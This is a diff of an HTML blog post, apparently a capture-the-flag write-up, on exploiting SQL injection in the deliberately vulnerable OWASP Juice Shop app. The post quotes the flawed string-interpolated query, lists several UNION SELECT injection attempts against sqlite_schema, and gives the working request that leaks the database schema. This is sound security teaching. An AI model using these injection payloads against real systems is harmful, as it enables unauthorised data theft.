 <span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">then</span>(([products]<span class="op">:</span> <span class="dt">any</span>) <span class="kw">=&gt;</span> {</span>
-<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>        const dataString <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(products)<span class="op">;</span></span>
-<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>        <span class="fu">for</span> (let i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> products<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> dataString <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(products)<span class="op">;</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> products<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
 <span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">name</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">name</span>)<span class="op">;</span></span>
 <span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>          products[i]<span class="op">.</span><span class="at">description</span> <span class="op">=</span> req<span class="op">.</span><span class="fu">__</span>(products[i]<span class="op">.</span><span class="at">description</span>)<span class="op">;</span></span>
 <span id="cb9-15"><a href="#cb9-15" aria-hidden="true" tabindex="-1"></a>        }</span>
@@ -269,68 +320,110 @@ View full code
 <span id="cb9-21"><a href="#cb9-21" aria-hidden="true" tabindex="-1"></a>  }<span class="op">;</span></span>
 <span id="cb9-22"><a href="#cb9-22" aria-hidden="true" tabindex="-1"></a>}<span class="op">;</span></span></code></pre></div>
 </details>
-<p>I’m specifically looking at the line that uses string interpolation for a SQL query:</p>
-<div class="sourceCode" id="cb10"><pre class="sourceCode ts"><code class="sourceCode typescript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
+<p>I’m specifically looking at the line that uses string interpolation
+for a SQL query:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode ts"><code class="sourceCode typescript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>models<span class="op">.</span><span class="at">sequelize</span></span>
 <span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>      <span class="op">.</span><span class="fu">query</span>(</span>
 <span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>        <span class="co">// </span><span class="al">TODO</span><span class="co">: is there any problem with using string interpolation with SQL statements?</span></span>
 <span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="vs">`SELECT * FROM Products WHERE ((name LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39; OR description LIKE &#39;%</span><span class="sc">${</span>criteria<span class="sc">}</span><span class="vs">%&#39;) AND deletedAt IS NULL) ORDER BY name`</span></span>
 <span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>      )</span></code></pre></div>
 <p>Or rather:</p>
-<div class="sourceCode" id="cb11"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span> <span class="kw">OR</span> description <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span>) <span class="kw">AND</span> deletedAt <span class="kw">IS</span> <span class="kw">NULL</span>) <span class="kw">ORDER</span> <span class="kw">BY</span> name</span></code></pre></div>
-<p>So, we need to enter something that is going to give us the database schema from this query.</p>
-<p>Given the special situation of being two parenthesis deep, we know we’re going to have to add <code>'))</code> to the start of our query.</p>
-<p>Then, we’re going to need to append more data to the end of the query, so that we get back the data we’re looking for.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span> <span class="kw">OR</span> description <span class="kw">LIKE</span> <span class="st">&#39;%${criteria}%&#39;</span>) <span class="kw">AND</span> deletedAt <span class="kw">IS</span> <span class="kw">NULL</span>) <span class="kw">ORDER</span> <span class="kw">BY</span> name</span></code></pre></div>
+<p>So, we need to enter something that is going to give us the database
+schema from this query.</p>
+<p>Given the special situation of being two parenthesis deep, we know
+we’re going to have to add <code>'))</code> to the start of our
+query.</p>
+<p>Then, we’re going to need to append more data to the end of the
+query, so that we get back the data we’re looking for.</p>
 <p>How do we append data to the end of a query?</p>
 <blockquote>
-<p>In <a href="https://en.wikipedia.org/wiki/SQL">SQL</a> the <strong><code>UNION</code></strong> clause combines the results of two SQL queries into a single <a href="https://en.wikipedia.org/wiki/Table_(database)">table</a> of all matching <a href="https://en.wikipedia.org/wiki/Row_(database)">rows</a>.</p>
+<p>In <a href="https://en.wikipedia.org/wiki/SQL">SQL</a> the
+<strong><code>UNION</code></strong> clause combines the results of two
+SQL queries into a single <a
+href="https://en.wikipedia.org/wiki/Table_(database)">table</a> of all
+matching <a
+href="https://en.wikipedia.org/wiki/Row_(database)">rows</a>.</p>
 <p>— <cite><a href="https://en.wikipedia.org/wiki/Set_operations_(SQL)#UNION_operator">Wikipedia</a></cite></p>
 </blockquote>
-<p>So, we’re going to need get use something like <code>')) UNION SELECT something FROM somewhere</code> to make our query work.</p>
+<p>So, we’re going to need get use something like
+<code>')) UNION SELECT something FROM somewhere</code> to make our query
+work.</p>
 <p>According to the sqlite docs:</p>
 <blockquote>
-<p>The schema table can always be referenced using the name “<strong>sqlite_schema</strong>”, especially if qualifed by the schema name like “main.sqlite_schema” or “temp.sqlite_schema”.</p>
+<p>The schema table can always be referenced using the name
+“<strong>sqlite_schema</strong>”, especially if qualifed by the schema
+name like “main.sqlite_schema” or “temp.sqlite_schema”.</p>
 <p>— <cite><a href="https://www.sqlite.org/schematab.html">SQLite Docs</a></cite></p>
 </blockquote>
-<p>So, it’s going to be something like <code>')) UNION SELECT something FROM sqlite_schema</code>.</p>
-<p>We know <code>sql</code> will be the name of the column with the schema. But, in order to get the rest of the column names, we can just guess with their positions.</p>
+<p>So, it’s going to be something like
+<code>')) UNION SELECT something FROM sqlite_schema</code>.</p>
+<p>We know <code>sql</code> will be the name of the column with the
+schema. But, in order to get the rest of the column names, we can just
+guess with their positions.</p>
 <p>So, we can try:</p>
-<div class="sourceCode" id="cb12"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span>
 <span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 2</span></span>
 <span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 3</span></span>
 <span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> sql,<span class="dv">2</span>,<span class="dv">3</span>,<span class="dv">4</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 4</span></span>
 <span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co">-- et cetera...</span></span></code></pre></div>
 <p>So, let’s put it into action.</p>
 <h3 id="execution">Execution</h3>
-<p>So, first, let’s open up Burp Suite to see the requests we’re sending to the server.</p>
-<p>We can go under <code>Proxy</code> and open up a browser to <code>localhost:3000</code> to see our Juice Shop:</p>
-<p><img src="../assets/juice-shop/injection/image-20231010223036592.png" alt="Juice Shop and Proxy, side by side" />Here are a bunch of the requests that fire off when we first open the page:</p>
+<p>So, first, let’s open up Burp Suite to see the requests we’re sending
+to the server.</p>
+<p>We can go under <code>Proxy</code> and open up a browser to
+<code>localhost:3000</code> to see our Juice Shop:</p>
+<p><img src="../assets/juice-shop/injection/image-20231010223036592.png"
+alt="Juice Shop and Proxy, side by side" />Here are a bunch of the
+requests that fire off when we first open the page:</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010223138087.png" alt="Lots of requests" /><figcaption aria-hidden="true">Lots of requests</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010223138087.png"
+alt="Lots of requests" />
+<figcaption aria-hidden="true">Lots of requests</figcaption>
 </figure>
-<p>One of them looks like what we’re looking for: <code>/rest/products/search?q=</code></p>
+<p>One of them looks like what we’re looking for:
+<code>/rest/products/search?q=</code></p>
 <p>Let’s send that one to the Repeater.</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010225613568.png" alt="By default, it returns all of the items" /><figcaption aria-hidden="true">By default, it returns all of the items</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010225613568.png"
+alt="By default, it returns all of the items" />
+<figcaption aria-hidden="true">By default, it returns all of the
+items</figcaption>
 </figure>
 <p>Let’s try and inject our first query:</p>
-<div class="sourceCode" id="cb13"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="dv">1</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span></code></pre></div>
-<p>To inject it, we’re going to need to to change the request to query with <code>')) UNION SELECT 1 FROM sqlite_schema --</code>. Also, remember that url parameters are separated by <code>+</code>, giving us:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode sql"><code class="sourceCode sql"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> Products <span class="kw">WHERE</span> ((name <span class="kw">LIKE</span> <span class="st">&#39;%&#39;</span>)) <span class="kw">UNION</span> <span class="kw">SELECT</span> <span class="dv">1</span> <span class="kw">FROM</span> sqlite_schema <span class="co">-- attempt 1</span></span></code></pre></div>
+<p>To inject it, we’re going to need to to change the request to query
+with <code>')) UNION SELECT 1 FROM sqlite_schema --</code>. Also,
+remember that url parameters are separated by <code>+</code>, giving
+us:</p>
 <pre class="http"><code>GET /rest/products/search?q=&#39;))+UNION+SELECT+1+FROM+sqlite_schema+--</code></pre>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010225815901.png" alt="Error found successfully" /><figcaption aria-hidden="true">Error found successfully</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010225815901.png"
+alt="Error found successfully" />
+<figcaption aria-hidden="true">Error found successfully</figcaption>
 </figure>
 <p>This is the error we want to see.</p>
-<p>Then, we can simply increase the number of columns we’re querying until we find the correct one:</p>
+<p>Then, we can simply increase the number of columns we’re querying
+until we find the correct one:</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010225940584.png" alt="Query 1,2" /><figcaption aria-hidden="true">Query 1,2</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010225940584.png"
+alt="Query 1,2" />
+<figcaption aria-hidden="true">Query 1,2</figcaption>
 </figure>
 <p>Eventually, we’ll find the answer with</p>
 <pre class="http"><code>GET /rest/products/search?q=&#39;))+UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_schema+--</code></pre>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010230936749.png" alt="The data is leaked" /><figcaption aria-hidden="true">The data is leaked</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010230936749.png"
+alt="The data is leaked" />
+<figcaption aria-hidden="true">The data is leaked</figcaption>
 </figure>
 <p>And there we go!</p>
-<div class="sourceCode" id="cb16"><pre class="sourceCode json"><code class="sourceCode json"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
 <span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
 <span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="dv">2</span><span class="fu">,</span></span>
 <span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;description&quot;</span><span class="fu">:</span> <span class="dv">3</span><span class="fu">,</span></span>
@@ -341,12 +434,18 @@ View full code
 <span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;updatedAt&quot;</span><span class="fu">:</span> <span class="dv">8</span><span class="fu">,</span></span>
 <span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;deletedAt&quot;</span><span class="fu">:</span> <span class="dv">9</span></span>
 <span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
-<p>That’s our schema for <em>this</em> database, leaked via SQL injection.</p>
-<p>We can see more data from the <code>sql</code> table at the end of the response:</p>
+<p>That’s our schema for <em>this</em> database, leaked via SQL
+injection.</p>
+<p>We can see more data from the <code>sql</code> table at the end of
+the response:</p>
 <figure>
-<img src="../assets/juice-shop/injection/image-20231010231156994.png" alt="The final item, and the first table schema" /><figcaption aria-hidden="true">The final item, and the first table schema</figcaption>
+<img src="../assets/juice-shop/injection/image-20231010231156994.png"
+alt="The final item, and the first table schema" />
+<figcaption aria-hidden="true">The final item, and the first table
+schema</figcaption>
 </figure>
-<p>This is where we see the schema for every table in the database, and what triggers the flag.</p>
+<p>This is where we see the schema for every table in the database, and
+what triggers the flag.</p>
 
 
     </article>
@@ -366,7 +465,7 @@ View full code
 
   <div class="page-bottom">
     <div class="copyright">
-      &copy; 2023 Zack Sargent
+      &copy; 2024 Zack Sargent
     </div>
     <div class="top">
       <a href="javascript:window.scrollTo({ top: 0, behavior: 'smooth' })">
